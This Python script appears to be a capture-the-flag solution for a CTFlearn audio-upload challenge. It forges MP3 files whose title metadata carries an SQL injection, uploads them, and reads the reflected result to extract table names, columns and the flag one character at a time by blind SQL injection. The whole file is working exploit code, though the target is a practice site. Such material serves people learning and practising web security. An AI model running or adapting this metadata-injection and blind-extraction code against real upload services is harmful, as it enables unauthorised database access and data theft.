import requests
import subprocess
import re
import string
import uuid

url = "https://web.ctflearn.com/audioedit/"
s = requests.Session()

file_name = "payload.mp3"

def create_payload_file(payload):
    cmd = [
        "ffmpeg",
        "-y",
        "-f", "lavfi",
        "-i", "anullsrc=r=44100:cl=mono",
        "-t", "1",
        "-metadata", f"title={payload}",
        "-metadata", f"artist={str(uuid.uuid4())}",
        "-q:a", "9",
        file_name
    ]

    subprocess.run(cmd, capture_output=True)

    with open(file_name, 'rb') as f:
        return f.read()

def sqli(query):
    res = s.post(f"{url}/submit_upload.php", files={ 'audio': (file_name, create_payload_file(f"' || ({query}) || '"), 'audio/mpeg') })

    try:
        leak = re.findall(r'Title: <small>(.+)</small>', res.text)[0]
        return int(leak)
    except:
        print(res.text)
        return res.text
    
charset = string.ascii_lowercase + string.digits + '.{}_'

def leak_string(col, table, additional='', offset=0):
    length = 0

    while True:
        print("Trying:", length)
        if sqli(f"select length({col})={length} from {table} {additional} limit 1 offset {offset}"):
            print("Found length:", length)
            break
        
        length += 1
    
    name = ""
    max_len = 7

    while len(name) < length:
        for char in charset:
            if len(name) > max_len:     # metadata truncation will affect the payload
                search_term = f'%{name[len(name) - max_len:]}{char}%'
            else:
                search_term = f'{name}{char}%'

            print("Trying:", char, '|', name)
            if sqli(f"select {col} like '{search_term}' from {table} {additional} limit 1 offset {offset}"):
                name += char
                break

    print("Found:", name, '|', table)

def leak_tables():
    num_tables = 0

    while True:
        print("Trying:", num_tables)
        if sqli(f"select count(table_name)={num_tables} from information_schema.tables where table_schema=database()"):
            print(f"Found tables: {num_tables}")
            break

        num_tables += 1

    for _ in range(num_tables):
        leak_string("table_name", 'information_schema.tables', 'where table_schema=database()')

def leak_columns(table):
    for i in range(4):
        leak_string("column_name", 'information_schema.columns', f'where table_name="{table}"', i)

leak_tables()
print(sqli('select count(*) > 0 from (select * from audioedit) as x where x.title like "%flag%"'))
leak_string('x.file', '(select * from audioedit) as x', 'where x.title="flag"')